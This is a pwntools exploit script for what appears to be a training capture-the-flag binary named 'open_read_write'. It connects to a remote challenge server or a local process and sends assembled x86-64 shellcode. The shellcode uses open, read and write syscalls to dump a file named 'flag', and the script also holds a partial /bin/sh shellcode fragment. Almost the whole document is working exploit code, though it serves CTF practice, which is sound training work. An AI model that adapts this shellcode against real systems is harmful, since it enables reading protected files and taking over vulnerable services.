from pwn import *
from time import sleep

elf = ELF('./open_read_write')
context.arch = 'amd64'
context.terminal = ['konsole', '-e']

if 'REM' in os.environ:
    p = remote('open-read-write.training.offensivedefensive.it', 8080, ssl=True)
else:
    if 'GDB' in os.environ:
        print('DEBUG MODE')
        p = gdb.debug('./open_read_write', api=True, gdbscript='''
        b *0x00401539
        c
        ''')
    else:
        p = elf.process()

def stop(s='Waiting...'):
    if 'NOSTP' not in os.environ: input(s)
    else: sleep(1)

sh = '''
# 0x0068732f6e69622f
mov rax, 0x0068732f6e69622f
push rax
mov rax, rbp
xor rsi, rsi
xor rdx, rdx
'''

sh_t_write_hello = '''
mov rax, 0x0000006f6c6c6568
push rax
mov r15, rsp

mov rax, 0x01
mov rdi, 0x01
mov rdx, 5
mov rsi, r15
syscall
'''

sh_t_open_flag_read_contents = '''
mov rax, 0x67616c66
push rax
mov r15, rsp

mov rax, 0x02
mov rdi, r15
xor rsi, rsi
xor rdx, rdx
syscall
mov r15, rax

mov rax, 0x00
mov rdi, r15
push 0x0
mov rsi, rsp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov rdx, 45
syscall

mov rax, 0x01
mov rdi, 0x01
; mov rsi, rsi
mov rdx, 45
syscall
'''

sleep(0.5)
log.info(p.clean())
sleep(0.5)

p.sendline(asm(sh_t_open_flag_read_contents))

log.success(p.clean())

p.interactive()